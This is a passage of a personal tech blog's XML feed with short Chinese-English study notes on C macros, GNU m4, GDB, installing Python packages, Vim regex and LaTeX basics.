    <content type="html"><![CDATA[<p><a href="https://onevcat.com/2014/01/black-magic-in-macro/">reference</a></p><h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><p>C中宏分两类: </p><ul><li>对象宏(object-like macro)</li><li>函数宏(function-like macro)</li></ul>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
    <tags>
      
      <tag>macro c</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GNU m4 教程 Notes</title>
    <link href="/2022/08/07/GNU-m4-%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/08/07/GNU-m4-%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://segmentfault.com/a/1190000004104696">reference</a></p><h1 id="GNU-m4-简介"><a href="#GNU-m4-简介" class="headerlink" title="GNU m4 简介"></a>GNU m4 简介</h1><p>m4 是一种宏处理器, 它扫描用户输入的文本并将其输出, 期间如果遇到宏就将其展开后输出.</p><p>除展开宏, m4 内建的宏能够加载文件, 执行Shell命令, 做整数运算, 操纵文本, 形成递归等.</p><h1 id="m4-基本工作过程"><a href="#m4-基本工作过程" class="headerlink" title="m4 基本工作过程"></a>m4 基本工作过程</h1><p>在”C Programming Language” 中将<strong>流</strong>(stream), 定义为与磁盘或其它外围设备关联的数据的源或目的地. 也就可以理解为文件.</p><p>由此, 输入流就是与磁盘或其他外围设备关联的数据的源. </p><p>输出流就是与磁盘或其他外围设备关联的数据的源或目的地.</p><h1 id="m4-工作空间"><a href="#m4-工作空间" class="headerlink" title="m4 工作空间"></a>m4 工作空间</h1><p>需要一个来<mark>状态寄存器</mark>判断当前从输入流中读取的文本是宏还是非宏.</p><p>有一个缓存空间, 用于提高文本效率. 其容量为512KB, 当它满了的时候, m4会自动将其中的内容妥善保存到一份临时文件中备用. 这里官方的概念为转移(Diversion).</p><p>使用<code>divert</code>宏, 在各缓存中切换, 有十种级别的缓存.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br></code></pre></td></tr></table></figure><p>最后, m4会将各个缓存中的文本汇总到0号缓存中.</p><p>缓存的汇总过程是按照缓存级别进行的. 最后会将0号缓存中的内容依序发送到输出流中.</p><p>文本流经m4的过程不可逆.</p><p>逆向工程能在一定程度上复原某个程序的代码, 但它却永远无法基于宏的展开重现宏的定义.</p><h1 id="暗黑缓存"><a href="#暗黑缓存" class="headerlink" title="暗黑缓存"></a>暗黑缓存</h1><p>编号为负数, 不限数量.</p><p>m4 不会将暗黑缓存汇总的内容发送到输出流.</p><p>暗黑缓存的主要作用是作为宏定义的空间.</p><p>长度为零的字符串被发送到输出流, 不会对其产生影响.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(say_hello_world, Hello World!)</span></span><br>say_hello_world<br></code></pre></td></tr></table></figure><p><code>divert(0)</code> 及其他语句后面有一个换行符, 会对输出产生影响.</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">$ <span class="hljs-name">m4</span> hello.<span class="hljs-name">m4</span><br></code></pre></td></tr></table></figure><p>使用暗黑缓存以避免一个换行符的影响:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(-<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(say_hello_world, Hello World!)</span></span><br><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br>say_hello_world<br></code></pre></td></tr></table></figure><p>调用时避免换行符的影响:</p><ul><li>divert(0)后不换行</li><li>使用m4内建的dnl宏<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(-<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(say_hello_world, Hello World!)</span></span><br><span class="hljs-function"><span class="hljs-title">divert</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">dnl</span></span><br>say_hello_world<br></code></pre></td></tr></table></figure></li></ul><h1 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h1><p><code>define</code>关键字用于定义宏:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">define</span><span class="hljs-params">(hello, HELLO)</span></span><br></code></pre></td></tr></table></figure><p>前一个是宏, 后一个是展开的值.</p><p><code>define</code>本身就是一个宏, 也会被m4展开, 只不过它的展开结果是一个空字符串.</p><h1 id="有参数的宏"><a href="#有参数的宏" class="headerlink" title="有参数的宏"></a>有参数的宏</h1><p>宏可以有参数.</p><p>遵循POSIX标准的m4, 允许一个宏最多有9个参数. 在宏体中可使用<code>$1</code>,…,<code>$9</code>来引用. GNU的m4不限制宏的参数数量.</p><p><mark>注意</mark>, c宏与m4宏的调用有点区别. 在C中, 调用一个宏, 宏名与其后的”(“可以有空格, 而m4宏的调用不允许这样.</p><p>m4的宏体是一个带引号的字符串, 做引号与<code>~</code>同键, 有引号与<code>&quot;</code>同键.</p><p><code>,</code>会被m4捕获为宏参数分隔符, 而引号可使之逃逸.</p><h1 id="宏的陷阱"><a href="#宏的陷阱" class="headerlink" title="宏的陷阱"></a>宏的陷阱</h1><p>m4允许宏的重定义, 结果是新的宏定义会覆盖旧的.</p><p>m4的宏命名规则: 只允许使用字母, 数字以及下划线构造宏名, 并且宏名只能以字母或下划线开头.</p><p>对宏进行重定义时, 需要借助引号.</p><p>引号的作用:</p><ul><li>m4 将一切没有引号的文本都视为宏。对于已定义的宏，m4 会将其展开；对于未定义的宏，m4 会按其字面将其输出。</li><li>加了引号的文本，m4 不再检测它们是不是宏，而是将其作为普通文本按字面输出。</li></ul><p>也就是, 加了引号的文本, 会被m4认为普通字符输出.</p><h1 id="记号"><a href="#记号" class="headerlink" title="记号"></a>记号</h1><p>m4输入流原理:<br>m4 对输入流是以记号（Token）为单元进行读取的。一般情况下，m4 会将读取的每个记号直接发送到输出流，但是当 m4 发现某个单词是已定义的宏名时，它会将这个宏展开。在对宏进行展开的过程中，m4 可能会需要读入更多的文本以获取宏的参数。宏展开的结果会被插入到输入流剩余部分的前端，也就是说，宏展开后所得到的文本会被 m4 重新读取，解析为记号，继续处理。</p><p>在宏参数列表中, 在<code>,</code>之后的空格是无意义的字符.</p><p>空的字符串, 虽然不具备被 m4 发送到输出流的资格, 但是它可以作为其他记号的边界记号使用.</p><h1 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h1><p><code>#</code> 是行注释符, m4 的注释文本也会被发送到输出流.</p><p>可使用<code>changecom</code>宏修改 m4 默认的注释符:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">changecom</span>(`@@&#x27;)<br></code></pre></td></tr></table></figure><p>使用块注释符:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">changecom</span><span class="hljs-params">(/*,*/)</span></span><br></code></pre></td></tr></table></figure><p>不回显注释文本, 使用<code>dnl</code>:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">define(<span class="hljs-symbol">`VERSION&#x27;</span>,<span class="hljs-symbol">`A1&#x27;</span>)<br><span class="hljs-keyword">VERSION</span> dnl <span class="hljs-keyword">VERSION</span> <span class="hljs-symbol">`quote&#x27;</span> unmatched`<br></code></pre></td></tr></table></figure><h1 id="引号-逃逸以及非ASCII字符"><a href="#引号-逃逸以及非ASCII字符" class="headerlink" title="引号, 逃逸以及非ASCII字符"></a>引号, 逃逸以及非ASCII字符</h1><p>使用<code>changequote</code>宏修改m4默认的引号定界符:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">changequote</span><span class="hljs-params">(&lt;!,!&gt;)</span></span><br></code></pre></td></tr></table></figure><p>不向其提供参数, 即恢复默认引号定界符.</p><h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><p><code>ifdef</code>宏用于判断宏是否定义, <code>ifelse</code>宏判断表达式的真假.</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ifdef</span>(`a&#x27;, b)<br></code></pre></td></tr></table></figure><p>如果<code>a</code>是已定义宏, 那么这条语句的展开结果是<code>b</code>.<br><code>ifelse(a,b,c,d)</code>会比较字符串<code>a</code>与<code>b</code>是否相同, 如果它们相同, 这条语句的展开结果是字符串<code>c</code>, 否则则展开为字符串<code>d</code>.</p><p><code>ifelse</code>可以支持多个分支.</p><h1 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h1><p>m4内建宏<code>eval</code>, 对整型数的运算表达式进行求值.</p><p>在<code>m4</code>中可以通过<code>esyscmd</code>宏访问Shell.</p><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><p>m4会将当前宏的展开结果插入到待读取的输入流的前端.</p>]]></content>
    
    
    <categories>
      
      <category>GNU m4</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Debugging with GDB v8.3.1 Notes</title>
    <link href="/2022/08/07/Debugging-with-GDB-v8-3-1-Notes/"/>
    <url>/2022/08/07/Debugging-with-GDB-v8-3-1-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="1-A-Simple-GDB-Session"><a href="#1-A-Simple-GDB-Session" class="headerlink" title="1 A Simple GDB Session"></a>1 A Simple GDB Session</h1><p>区分<code>next</code>和<code>step</code>:</p><ul><li><code>next</code> 用在执行整个程序</li><li><code>step</code> 用在进入到一个函数的内部程序</li></ul><p><code>continue</code>应该是使暂停的程序继续运行.</p><h1 id="2-Getting-In-and-Out-of-GDB"><a href="#2-Getting-In-and-Out-of-GDB" class="headerlink" title="2 Getting In and Out of GDB"></a>2 Getting In and Out of GDB</h1><p>The command-line options described here are designed to cover a variety of situations.</p><p>You can start with both an executeble program and a core file specified:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">gdb <span class="hljs-keyword">program</span> core<br></code></pre></td></tr></table></figure><p>第二个 argument 可以改为 process ID, 以此 debug a running process:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> program <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h3 id="2-1-1-Choosing-Files"><a href="#2-1-1-Choosing-Files" class="headerlink" title="2.1.1 Choosing Files"></a>2.1.1 Choosing Files</h3><p>If you prefer, you can flag option arguments with ‘–’ rather than ‘-‘.</p><h3 id="2-1-2-Choosing-Modes"><a href="#2-1-2-Choosing-Modes" class="headerlink" title="2.1.2 Choosing Modes"></a>2.1.2 Choosing Modes</h3><h3 id="2-1-3-What-GDB-Does-During-Startup"><a href="#2-1-3-What-GDB-Does-During-Startup" class="headerlink" title="2.1.3 What GDB Does During Startup"></a>2.1.3 What GDB Does During Startup</h3><p>The GDB init file are normally called <code>.gdbinit</code>.</p><h2 id="2-2-Quitting-GDB"><a href="#2-2-Quitting-GDB" class="headerlink" title="2.2 Quitting GDB"></a>2.2 Quitting GDB</h2><h2 id="2-3-Shell-Commands"><a href="#2-3-Shell-Commands" class="headerlink" title="2.3 Shell Commands"></a>2.3 Shell Commands</h2><p>Using shell command during debugging:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">!<span class="hljs-keyword">command</span>-<span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p>可直接使用<code>make</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">make</span> <span class="hljs-keyword">make</span>-<span class="hljs-keyword">args</span><br></code></pre></td></tr></table></figure><h2 id="2-4-Logging-Output"><a href="#2-4-Logging-Output" class="headerlink" title="2.4 Logging Output"></a>2.4 Logging Output</h2><p>保存 the output of GDB commands to a file.</p><h1 id="3-GDB-Commands"><a href="#3-GDB-Commands" class="headerlink" title="3 GDB Commands"></a>3 GDB Commands</h1><h2 id="3-1-Command-Syntax"><a href="#3-1-Command-Syntax" class="headerlink" title="3.1 Command Syntax"></a>3.1 Command Syntax</h2><p>A blank line as input to GDB means to repeat the previous command. User-defined commands can disable this feature.</p><h2 id="3-2-Command-Completion"><a href="#3-2-Command-Completion" class="headerlink" title="3.2 Command Completion"></a>3.2 Command Completion</h2><p>按<code>M-?</code>和按两次<code>TAB</code>作用相同.</p><h2 id="3-3-Getting-Help"><a href="#3-3-Getting-Help" class="headerlink" title="3.3 Getting Help"></a>3.3 Getting Help</h2><p>Using <code>help</code>.</p><p><code>help class</code>, 输入<code>help</code>后出现的是<code>class</code>, <code>help class</code> 会显示这个class中的命令.</p><p><code>apropos args</code>, the <code>apropos</code> command searches through all of the GDB commands, and their documentation, for the <mark>regular expression</mark> specified in <code>args</code>.</p><p><code>complete args</code>, the <code>complete args</code> command lists all the possible completions for the beginning of a command.</p><p>除了<code>help</code>, <code>info</code> 和 <code>show</code> 都能够给出 the state of your program, or the state of GDB itself.</p><ul><li>list, 用于 describing the state of your program, 如<code>info args</code>, <code>info registers</code>, <code>info breakpoints</code>.</li><li>set, 用于 assign an environment variable.</li><li>show, 用于 describing the state of GDB itself. To display all the settable parameters and their current values, you can use <code>show</code> with no argument or <code>info set</code>.</li></ul><h1 id="4-Running-Programs-Under-GDB"><a href="#4-Running-Programs-Under-GDB" class="headerlink" title="4 Running Programs Under GDB"></a>4 Running Programs Under GDB</h1><h2 id="4-1-Compiling-for-Debugging"><a href="#4-1-Compiling-for-Debugging" class="headerlink" title="4.1 Compiling for Debugging"></a>4.1 Compiling for Debugging</h2><p>在编译时使用<code>-g</code>选项.</p><p>Some compilers are unable to handle the <code>-g</code> and <code>-O</code> options together.</p><p>Always use <code>-g</code> whenever you compile a program is recommended.</p><p><code>DWARF</code> is currently the most expressive and best supported debugging format in GDB.</p><h2 id="4-2-Starting-your-Program"><a href="#4-2-Starting-your-Program" class="headerlink" title="4.2 Starting your Program"></a>4.2 Starting your Program</h2><ul><li>start, this command does the equivalent of setting a temporary breakpoint at the beginning of the main procedure and then invoking the <code>run</code> command.</li></ul><h2 id="4-3-Your-Program’s-Arguments"><a href="#4-3-Your-Program’s-Arguments" class="headerlink" title="4.3 Your Program’s Arguments"></a>4.3 Your Program’s Arguments</h2><p>The arguments to your program can be specified by the arguments of the <code>run</code> command.</p>]]></content>
    
    
    <categories>
      
      <category>GDB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装Python包</title>
    <link href="/2022/08/06/%E5%AE%89%E8%A3%85Python%E5%8C%85/"/>
    <url>/2022/08/06/%E5%AE%89%E8%A3%85Python%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="使用-pip"><a href="#使用-pip" class="headerlink" title="使用 pip"></a>使用 pip</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> matplotlib<br></code></pre></td></tr></table></figure><h1 id="使用-python"><a href="#使用-python" class="headerlink" title="使用 python"></a>使用 python</h1><p>下载源代码后:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim 中的正则 Notes</title>
    <link href="/2022/08/06/Vim-%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99-Notes/"/>
    <url>/2022/08/06/Vim-%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="非捕获型括号"><a href="#非捕获型括号" class="headerlink" title="非捕获型括号"></a>非捕获型括号</h1><p>在括号前加<code>%</code>:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><h1 id="区分大小写"><a href="#区分大小写" class="headerlink" title="区分大小写"></a>区分大小写</h1><p>使用<code>\c</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Writing fraction in LaTeX</title>
    <link href="/2022/08/05/Writing-fraction-in-LaTeX/"/>
    <url>/2022/08/05/Writing-fraction-in-LaTeX/</url>
    
    <content type="html"><![CDATA[<p>use:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\frac</span><span class="hljs-template-variable">&#123;&#125;</span><span class="hljs-template-variable">&#123;&#125;</span><br></code></pre></td></tr></table></figure><p>第一个<code>&#123;&#125;</code>为分子, 后一个为分母.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>简单高效LaTeX Notes</title>
    <link href="/2022/08/04/%E7%AE%80%E5%8D%95%E9%AB%98%E6%95%88LaTeX-Notes/"/>
    <url>/2022/08/04/%E7%AE%80%E5%8D%95%E9%AB%98%E6%95%88LaTeX-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-写给读者"><a href="#第1章-写给读者" class="headerlink" title="第1章 写给读者"></a>第1章 写给读者</h1><p>Macro 是一个计算机概念, 指用单个命令或操作完成一系列底层命令或操作的组合.</p><p>LaTeX 在 TeX 的基础上定义了众多的宏命令.</p><p>TeX 系统允许你以数字参数的方式把排版内容写到任意的位置.</p><p>LaTeX 生成的文件格式一般是 pdf 和dvi 格式. LaTeX 无法生成 doc 或者 docx 格式的文件, 因为那是微软的商用格式, 两者的工作机理也完全不同.</p><h1 id="第2章-LaTeX-环境配置"><a href="#第2章-LaTeX-环境配置" class="headerlink" title="第2章 LaTeX 环境配置"></a>第2章 LaTeX 环境配置</h1><p><a href="https://tug.org/texlive/">下载 TeX Live</a><br><a href="https://www.texstudio.org/">安装TeX Studio</a></p><h2 id="2-3-TeX-Live-本地宏包管理"><a href="#2-3-TeX-Live-本地宏包管理" class="headerlink" title="2.3 TeX Live 本地宏包管理"></a>2.3 TeX Live 本地宏包管理</h2><p>使用 TeX Live manager, 使用<code>tlmgr</code>命令.</p><h2 id="2-6-编译文档"><a href="#2-6-编译文档" class="headerlink" title="2.6 编译文档"></a>2.6 编译文档</h2><h3 id="2-6-2-错误的排查"><a href="#2-6-2-错误的排查" class="headerlink" title="2.6.2 错误的排查"></a>2.6.2 错误的排查</h3><p>可以翻阅文件夹中的日志记录(log 文件), 来找到 Warnings 开头的记录, 或者 Overfull&#x2F;Underfull 开头的记录.</p><ul><li>由于 LaTeX 的编译原理(第一次生成 aux 文件, 第二次再引用它), 目录想要合理显示, 需要连续编译两次.</li></ul><p>一个用于排查语法错误的宏包: syntonly. 加载此宏包后, 可以在导言区加入<code>\syntaxonly</code>命令, LaTeX 会只排查语法而不生成任何文档.</p><h3 id="2-6-3-TeX帮助资源"><a href="#2-6-3-TeX帮助资源" class="headerlink" title="2.6.3 TeX帮助资源"></a>2.6.3 TeX帮助资源</h3><p>使用 <code>texdoc</code> 命令:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>texdoc ctex<br></code></pre></td></tr></table></figure><h3 id="2-6-4-TeX-使用工具"><a href="#2-6-4-TeX-使用工具" class="headerlink" title="2.6.4 TeX 使用工具"></a>2.6.4 TeX 使用工具</h3><ul><li>手写符号识别, <a href="http://detexify.kirelabs.org/classify.html">Detexify</a>.</li><li>公式截图识别, <a href="https://mathpix.com/">Snip</a></li></ul><h1 id="第3章-LaTeX-基础"><a href="#第3章-LaTeX-基础" class="headerlink" title="第3章 LaTeX 基础"></a>第3章 LaTeX 基础</h1><h2 id="认识-LaTeX"><a href="#认识-LaTeX" class="headerlink" title="认识 LaTeX"></a>认识 LaTeX</h2><h3 id="3-1-1-命令与环境"><a href="#3-1-1-命令与环境" class="headerlink" title="3.1.1 命令与环境"></a>3.1.1 命令与环境</h3><p>LaTeX 中的命令通常是由一个反斜杠加命令名称, 再加上花括号内的参数构成的.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\documentclass</span><span class="hljs-template-variable">&#123;ctexart&#125;</span><br></code></pre></td></tr></table></figure><p>如果一些选项是备选的, 那么通常会在花括号前用方括号标出:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">\documentclass<span class="hljs-selector-attr">[a4paper]</span>&#123;ctexart&#125;<br></code></pre></td></tr></table></figure><p>注意: 不带参数的命令后面如果想打印空格, 请在一对内部为空的话括号后键入空格, 否则空格会被忽略.</p><h3 id="3-1-2-保留字符"><a href="#3-1-2-保留字符" class="headerlink" title="3.1.2 保留字符"></a>3.1.2 保留字符</h3><p>在LaTeX中有特殊含义的字符:</p><ul><li><h1 id="：自定义命令时，用于标明参数序号。"><a href="#：自定义命令时，用于标明参数序号。" class="headerlink" title="：自定义命令时，用于标明参数序号。"></a>：自定义命令时，用于标明参数序号。</h1></li><li>$ ：数学环境命令符。</li><li>% ：注释符，其后的该行命令都会视为注释。如果在行末添加这</li><li>个命令，可以防止 LaTeX 在行末插入一些奇怪的空白符。</li><li>^ ：数学环境中的上标命令符。</li><li>&amp; ：表格环境中的跳列符。</li><li>_ ：数学环境中的下标命令符。</li><li>{ 与 } ：用于标记命令的必选参数，或者标记某一部分命令使</li><li>其成为一个整体。</li><li>\ ：用于开始 LaTeX 命令。</li></ul><p>可用<code>\</code>来转义输出.</p><p>输出<code>\</code>可用<code>\texttt</code>:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\texttt&#123;char92&#125;</span> <span class="hljs-comment">#\texttt&#123;char[92]&#125;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-string">\texttt&#123;char`\\&#125;</span> <span class="hljs-comment">#需转义的字符需添加反斜线</span><br></code></pre></td></tr></table></figure><h3 id="3-1-3-导言区"><a href="#3-1-3-导言区" class="headerlink" title="3.1.3 导言区"></a>3.1.3 导言区</h3><p>任何一个LaTeX文档都应该有的结构:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">\documentclass[options]<span class="hljs-built_in">&#123;doc</span>-class&#125;<br>\begin<span class="hljs-built_in">&#123;document</span>&#125;<br>  ...<br>\<span class="hljs-keyword">end</span><span class="hljs-built_in">&#123;document</span>&#125;<br></code></pre></td></tr></table></figure><p>可以把导言区视为模板的定义.</p><p>在导言区最常见的是宏包的加载工作:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">\usepackage&#123;<span class="hljs-keyword">package</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-1-4-文件输出"><a href="#3-1-4-文件输出" class="headerlink" title="3.1.4 文件输出"></a>3.1.4 文件输出</h3><h2 id="3-2-标点与强调"><a href="#3-2-标点与强调" class="headerlink" title="3.2 标点与强调"></a>3.2 标点与强调</h2><p>在文本中使用<code>$$</code>书写数学符号.</p><p>如果在 LaTeX 中直接输入大于号, 小于号而不把它们放在数学环境中, 它们并不会被正确地打印.</p><h3 id="3-2-1-引号"><a href="#3-2-1-引号" class="headerlink" title="3.2.1 引号"></a>3.2.1 引号</h3><p>英文的单引号不是两个<code>&#39;</code>, 左引号是<code>\``, 而右引号是</code>‘&#96;.</p><h3 id="3-2-2-短横-省略号与破折号"><a href="#3-2-2-短横-省略号与破折号" class="headerlink" title="3.2.2 短横, 省略号与破折号"></a>3.2.2 短横, 省略号与破折号</h3><p>英文的省略号使用<code>\ldots</code>命令, 而不是三个句点.</p><h3 id="3-2-3-强调-粗与斜"><a href="#3-2-3-强调-粗与斜" class="headerlink" title="3.2.3 强调: 粗与斜"></a>3.2.3 强调: 粗与斜</h3><p>使用 <code>\emph&#123;text&#125;</code> 命令.</p><p>如果对一段已经这样转换为斜体的文本再使用这个命令, 它就会取消斜体.</p><h3 id="3-2-4-下划线与删除线"><a href="#3-2-4-下划线与删除线" class="headerlink" title="3.2.4 下划线与删除线"></a>3.2.4 下划线与删除线</h3><p>使用 <code>ulem</code> 宏包的 <code>uline</code> 命令.</p><h2 id="3-3-格式控制"><a href="#3-3-格式控制" class="headerlink" title="3.3 格式控制"></a>3.3 格式控制</h2><h3 id="3-3-1-空格-换行与分段"><a href="#3-3-1-空格-换行与分段" class="headerlink" title="3.3.1 空格, 换行与分段"></a>3.3.1 空格, 换行与分段</h3><p>在 LaTeX 中, 多个空格会被视为一个, 多个换行也会被视为一个.</p><p>宏包 <code>lettrine</code> 能够生成首字下沉的效果:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\lettrine</span><span class="hljs-template-variable">&#123;T&#125;</span><span class="hljs-template-variable">&#123;his&#125;</span><br></code></pre></td></tr></table></figure><h2 id="3-4-字体与颜色"><a href="#3-4-字体与颜色" class="headerlink" title="3.4 字体与颜色"></a>3.4 字体与颜色</h2><p>宋体, 黑体, 楷体属于字族; 加粗, 加斜属于字系和字形; 五号, 小四号属于字号. 这三者大概可以并称为字体.</p><h2 id="3-5-引用与注释"><a href="#3-5-引用与注释" class="headerlink" title="3.5 引用与注释"></a>3.5 引用与注释</h2><h1 id="第4章-数学排版"><a href="#第4章-数学排版" class="headerlink" title="第4章 数学排版"></a>第4章 数学排版</h1><h1 id="第5章-LaTeX-进阶"><a href="#第5章-LaTeX-进阶" class="headerlink" title="第5章 LaTeX 进阶"></a>第5章 LaTeX 进阶</h1><h2 id="5-1-自定义命令与环境"><a href="#5-1-自定义命令与环境" class="headerlink" title="5.1 自定义命令与环境"></a>5.1 自定义命令与环境</h2><p>自定义命令:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">\<span class="hljs-keyword">new</span><span class="hljs-type">command</span>&#123;cmd&#125;[args][<span class="hljs-keyword">default</span>]&#123;def&#125;<br></code></pre></td></tr></table></figure><ul><li>cmd ：新定义的命令，不能与现有命令重名。</li><li>args ：参数个数。</li><li>default ：首个参数，即 #1 的默认值。你可以定义只有一个</li><li>参数且参数含默认值的命令。</li><li>def ：定义的具体内容。参数 1 以 #1 代替，参数 2 以 #2 代替，以此类推。</li></ul>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Writing Greek Alphabet in LaTeX</title>
    <link href="/2022/08/04/Writing-Greek-Alphabet-in-LaTeX/"/>
    <url>/2022/08/04/Writing-Greek-Alphabet-in-LaTeX/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/zhouchen1998/article/details/119324338">reference</a></p><hr>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fix the error:UnboundLocalError: local variable num_rolls referenced before assignment</title>
    <link href="/2022/08/03/Fix-the-error-UnboundLocalError-local-variable-num-rolls-referenced-before-assignment/"/>
    <url>/2022/08/03/Fix-the-error-UnboundLocalError-local-variable-num-rolls-referenced-before-assignment/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>算法图解 Notes</title>
    <link href="/2022/08/03/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3-Notes/"/>
    <url>/2022/08/03/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3-Notes/</url>
    
